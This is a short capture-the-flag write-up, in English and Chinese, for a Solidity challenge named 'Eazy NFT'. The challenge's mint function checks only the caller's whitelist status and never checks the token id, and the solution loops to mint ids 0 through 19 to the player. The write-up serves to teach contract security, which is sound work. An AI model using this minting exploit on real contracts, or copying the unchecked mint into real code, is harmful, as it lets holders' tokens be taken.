## Eazy NFT

NFT market was slowly booming and Tony's friends were showing off their NFT holdings. Tony had finally whitelisted a NFT project, he's anxiously waiting for minting his first NFT.

这题对外调用的 `mint` 函数只检查了白名单，没有对 `tokenId` 做检查。
``` solidity 
    function mint(address to, uint256 tokenId) public {
        require(access[_msgSender()], "ET: caller is not accessed");
        _mint(to, tokenId);
    }
```

题目要求 0 到 19 号 id 都是 player 的。
``` solidity
    function solve() external {
        solved = true;
        for (uint256 i = 0; i < 20; i++) {
            if (et.ownerOf(i) != PLAYER) {
                solved = false;
            }
        }
    }
```

所以我们直接 mint 0 到 19 号即可。
``` solidity
        ET et = challenge.et();
        for (uint256 i = 0; i < 20; i++) {
            et.mint(player, i);
        }
```
